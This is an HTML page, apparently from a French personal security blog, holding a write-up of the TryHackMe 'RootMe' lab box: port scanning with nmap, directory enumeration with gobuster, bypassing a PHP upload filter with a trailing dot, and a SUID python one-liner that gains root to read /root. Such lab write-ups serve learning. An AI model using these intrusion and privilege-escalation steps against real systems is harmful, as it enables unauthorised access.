@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="fr-fr" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="
+La box RootMe est une box facile de la plateforme TryHackMe. Il y a deux drapeau à récupérer et pour commencer, il nous est fournit une adresse IP.
+Reconnaissance# Commençons par une simple reconnaissance, en plus d’accéder directement via le navigateur, on va voir quels ports sont ouverts sur la machine :
+nmap -sT 10.10.49.213 Starting Nmap 7.91 ( https://nmap.org ) at 2025-09-30 21:44 CEST Nmap scan report for 10.10.49.213 Host is up (0.14s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 37.01 secondsOn voit qu’il y a 2 ports ouverts : le port SSH et le port HTTP qui correspond à l’application web. En accédant à l’application on arrive sur la page dont la capture d’écran sert de bannière, on va donc énumérer les dossiers avec gobuster :
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/tryhackme/collapsed/rootme/">
+  <meta property="og:site_name" content="Blog de @camillegr">
+  <meta property="og:title" content="RootMe">
+  <meta property="og:description" content="La box RootMe est une box facile de la plateforme TryHackMe. Il y a deux drapeau à récupérer et pour commencer, il nous est fournit une adresse IP.
+Reconnaissance# Commençons par une simple reconnaissance, en plus d’accéder directement via le navigateur, on va voir quels ports sont ouverts sur la machine :
+nmap -sT 10.10.49.213 Starting Nmap 7.91 ( https://nmap.org ) at 2025-09-30 21:44 CEST Nmap scan report for 10.10.49.213 Host is up (0.14s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 37.01 secondsOn voit qu’il y a 2 ports ouverts : le port SSH et le port HTTP qui correspond à l’application web. En accédant à l’application on arrive sur la page dont la capture d’écran sert de bannière, on va donc énumérer les dossiers avec gobuster :">
+  <meta property="og:locale" content="fr_fr">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+
+
+  <meta itemprop="name" content="RootMe">
+  <meta itemprop="description" content="La box RootMe est une box facile de la plateforme TryHackMe. Il y a deux drapeau à récupérer et pour commencer, il nous est fournit une adresse IP.
+Reconnaissance# Commençons par une simple reconnaissance, en plus d’accéder directement via le navigateur, on va voir quels ports sont ouverts sur la machine :
+nmap -sT 10.10.49.213 Starting Nmap 7.91 ( https://nmap.org ) at 2025-09-30 21:44 CEST Nmap scan report for 10.10.49.213 Host is up (0.14s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 37.01 secondsOn voit qu’il y a 2 ports ouverts : le port SSH et le port HTTP qui correspond à l’application web. En accédant à l’application on arrive sur la page dont la capture d’écran sert de bannière, on va donc énumérer les dossiers avec gobuster :">
+  <meta itemprop="wordCount" content="403">
+
+<title>RootMe | Blog de @camillegr</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/tryhackme/collapsed/rootme/">
+<link rel="stylesheet" href="/book.min.8be08ee19c78fece5778ccbad7b7920c47943153ee0c9e856094873c56dca415.css" integrity="sha256-i&#43;CO4Zx4/s5XeMy617eSDEeUMVPuDJ6FYJSHPFbcpBU=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.aa3e45dc883265ddd9a1ef8c539caf21b27fd3b7d511e89e355c0164359a2193.js" integrity="sha256-qj5F3IgyZd3Zoe&#43;MU5yvIbJ/07fVEeieNVwBZDWaIZM=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><span>Blog de @camillegr</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-a1af4a996fb1fd454470e4444972e4f9" class="toggle"  />
+    <label for="section-a1af4a996fb1fd454470e4444972e4f9" class="flex">
+      <a href="/docs/ctf/" class="">
+        CTF</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-f3561ec6727758028b3a2ef314dd5169" class="toggle"  />
+    <label for="section-f3561ec6727758028b3a2ef314dd5169" class="flex">
+      <a href="/docs/ctf/rootmepro2025/" class="">
+        CTF 2025 | Root-Me Pro x DGSE</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/rootmepro2025/collapsed/mission1/" class="">
+      Mission 1 - IA</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/rootmepro2025/collapsed/mission2/" class="">
+      Mission 2 - SOC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/rootmepro2025/collapsed/mission3/" class="">
+      Mission 3 - Forensic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/rootmepro2025/collapsed/mission4/" class="">
+      Mission 4 - Pentest</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/rootmepro2025/collapsed/mission5/" class="">
+      Mission 5 - Mobile</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/rootmepro2025/collapsed/mission6/" class="">
+      Mission 6 - OSINT</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ba5e9fca78bb6e1afcafc6aba970bb3e" class="toggle"  />
+    <label for="section-ba5e9fca78bb6e1afcafc6aba970bb3e" class="flex">
+      <a role="button" class="">
+        Projets Personnels</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/projets/collapsed/tofuzz/" class="">
+      ToFuzz</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c65aa4e708b6bdd64019a9cd49da31df" class="toggle" checked />
+    <label for="section-c65aa4e708b6bdd64019a9cd49da31df" class="flex">
+      <a href="/docs/tryhackme/" class="">
+        TryHackMe</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme/collapsed/hammer/" class="">
+      Hammer</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme/collapsed/mrrobot/" class="">
+      Mr Robot</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme/collapsed/rootme/" class="active">
+      RootMe</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme/collapsed/tokyog/" class="">
+      Tokyo Ghoul</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme/collapsed/wonderlands/" class="">
+      Wonderlands</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a>
+      Divers</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/divers/blogs/" class="">
+      Blogs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>RootMe</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#accès-initial">Accès initial</a></li>
+        <li><a href="#escalade-de-privilège">Escalade de privilège</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><p><img src="../img/rootme_banner.png" alt="Application" /></p>
+<p>La box RootMe est une box facile de la plateforme TryHackMe. Il y a deux drapeau à récupérer et pour commencer, il nous est fournit une adresse IP.</p>
+<h1 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h1>
+<p>Commençons par une simple reconnaissance, en plus d’accéder directement via le navigateur, on va voir quels ports sont ouverts sur la machine :</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sT 10.10.49.213
+</span></span><span style="display:flex;"><span>Starting Nmap 7.91 <span style="color:#ff6ac1">(</span> https://nmap.org <span style="color:#ff6ac1">)</span> at 2025-09-30 21:44 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff6ac1">for</span> 10.10.49.213
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff6ac1">(</span>0.14s latency<span style="color:#ff6ac1">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ff9f43">998</span> closed ports
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff6ac1">done</span>: <span style="color:#ff9f43">1</span> IP address <span style="color:#ff6ac1">(</span><span style="color:#ff9f43">1</span> host up<span style="color:#ff6ac1">)</span> scanned in 37.01 seconds</span></span></code></pre></div><p>On voit qu’il y a 2 ports ouverts : le port SSH et le port HTTP qui correspond à l’application web. En accédant à l’application on arrive sur la page dont la capture d’écran sert de bannière, on va donc énumérer les dossiers avec gobuster :</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> gobuster dir -u http://10.10.49.213  -w ../../SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.8.2
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff6ac1">(</span>@TheColonial<span style="color:#ff6ac1">)</span> &amp; Christian Mehlmauer <span style="color:#ff6ac1">(</span>@firefart<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Url:                     http://10.10.49.213
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Threads:                 <span style="color:#ff9f43">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Wordlist:                ../../SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Negative Status codes:   <span style="color:#ff9f43">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> User Agent:              gobuster/3.8.2
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Timeout:                 <span style="color:#ff5c57">10s</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration <span style="color:#ff5c57">mode</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span>uploads              <span style="color:#ff6ac1">(</span>Status: 301<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 314<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>--&gt; http://10.10.49.213/uploads/<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>css                  <span style="color:#ff6ac1">(</span>Status: 301<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 310<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>--&gt; http://10.10.49.213/css/<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>js                   <span style="color:#ff6ac1">(</span>Status: 301<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 309<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>--&gt; http://10.10.49.213/js/<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>panel                <span style="color:#ff6ac1">(</span>Status: 301<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 312<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>--&gt; http://10.10.49.213/panel/<span style="color:#ff6ac1">]</span></span></span></code></pre></div><p>On trouve une page uploads qui nous permet de téléverser des fichiers.</p>
+<h2 id="accès-initial">Accès initial<a class="anchor" href="#acc%c3%a8s-initial">#</a></h2>
+<p><img src="../img/rootme_screen1.png" alt="Screenshot burp" /></p>
+<p>En essayant de charger des fichiers on s’aperçoit que que l’extension PHP est filtrée par une regex via l’extension du fichier. On essai les classiques %00, .pHp, et surcharge du .htaccess, mais finalement c’est en ajoutant juste un point à la fin que l’on réussi à téléverser notre fichier php .</p>
+<p><img src="../img/rootme_screen2.png" alt="Screenshot " /></p>
+<p>On peut maintenant exécuter des commandes bash sur la machine.</p>
+<h2 id="escalade-de-privilège">Escalade de privilège<a class="anchor" href="#escalade-de-privil%c3%a8ge">#</a></h2>
+<p>Nous ne pouvons pas énumérer les droits sudo car nous n’avons pas le mot de passe de l’utilisateur www-data et que le système ne nous le permet pas. Cependant on trouve quelques fichiers ayant les droits SUID :</p>
+<p><img src="../img/rootme_screen3.png" alt="Screenshot " /></p>
+<p>On voit que python a un SUID root, c’est un bon candidat pour une escalade de privilège. Nous allons directement essayer d’énumérer le contenu du dossier /root :</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/python2.7 -c <span style="color:#5af78e">&#39;import os;os.setuid(0); os.system(&#34;ls -la /root 2&gt;&amp;1&#34;)&#39;</span> 2&gt;&amp;<span style="color:#ff9f43">1</span></span></span></code></pre></div><p>L’énumération fonctionne ce qui veut dire que nous avons bien les droits root. On peut directement lire le flag /root/root.txt</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/python2.7 -c <span style="color:#5af78e">&#39;import os;os.setuid(0); os.system(&#34;cat /root/root.txt 2&gt;&amp;1&#34;)&#39;</span> 2&gt;&amp;<span style="color:#ff9f43">1</span></span></span></code></pre></div><p><img src="../img/rootme_screen_flag.png" alt="Screenshot burp" /></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/tryhackme/collapsed/mrrobot/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Mr Robot</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/tryhackme/collapsed/tokyog/" class="flex align-center">
+        <span>Tokyo Ghoul</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#accès-initial">Accès initial</a></li>
+        <li><a href="#escalade-de-privilège">Escalade de privilège</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
